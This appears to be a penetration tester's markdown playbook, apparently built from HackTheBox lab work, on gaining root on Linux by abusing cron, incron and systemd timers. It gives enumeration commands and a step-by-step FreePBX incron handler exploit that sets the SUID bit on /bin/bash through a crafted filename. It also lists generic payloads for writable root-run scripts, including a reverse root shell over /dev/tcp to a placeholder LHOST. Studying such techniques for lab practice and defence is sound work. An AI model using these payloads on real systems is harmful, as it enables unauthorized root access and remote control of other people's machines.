# Playbook — Cron / Incron / File-Watcher Abuse

**Trigger:** local enum shows scheduled or event-triggered execution running as a higher-privileged user (usually root). Classic, reliable root path on Linux boxes.

## Enumerate
```
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.{daily,hourly,weekly}/; cat /etc/cron.d/*
crontab -l; ls -la /var/spool/cron/            # per-user
cat /etc/incron.d/*; ls -la /var/spool/incron/ # incron tables (file-watch triggers)
systemctl list-timers --all                    # systemd timers
ps -ef | grep -iE '[i]ncron|[c]ron'            # confirm the daemon + its user
```
Also run **`pspy`** to catch short-lived root cron jobs and the exact commands they run without needing to read the tables.

## What makes it exploitable
Look for a root-run job whose **command, script, or watched path is writable by you** (or lives in a writable dir):
- Root cron runs a **world/asterisk-writable script** → overwrite the script with your payload.
- Root cron runs a script in a **writable directory** → wildcard injection (`tar`/`rsync`/`chown` `--checkpoint`, etc.), or replace the script.
- **incron** watches a **writable file/dir** and runs a handler as root when it changes → write the trigger.

## incron specifics (learned on Connected — FreePBX sysadmin)
incron table format: `<watched path> <events> <command>`, where `$#` = the changed file's name.
- If the watched **dir is writable** (`drwxrwxrwx`), dropping a file makes root run the handler with your filename.
- FreePBX `sysadmin_manager` handler: filename parsed as `module.hook.params`; requires a stock **GPG-signed** module+hook (can't forge, but any installed module passes); param filter blocks `` `'"$><&; `` **but not `|`**; then `system("$hookfile $params")` as root.
  - Filenames can't contain `/` → use the magic **`CONTENTS`** param (real params, incl. `/`, go *inside* the file).
  - Exploit: `printf '|chmod +s /bin/bash' > /usr/local/asterisk/incron/core.logrotate.CONTENTS` → `/bin/bash -p`.
  - Candidate module/hook pairs: `ls /var/www/html/admin/modules/*/hooks/`.

## Generic payloads for a writable root-run script
```
echo 'chmod +s /bin/bash' >> /path/to/root-script     # then /bin/bash -p
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> script
echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' >> script   # reverse root shell
```

## Habit
- After foothold, always check cron **and** incron **and** systemd timers — and prefer `pspy` to see the real commands. A writable watched path/script is one of the fastest roots.

→ back to `../Machines/machines-methodology.md` Phase 3. Full chain: `Machines/htb-connected.md`.
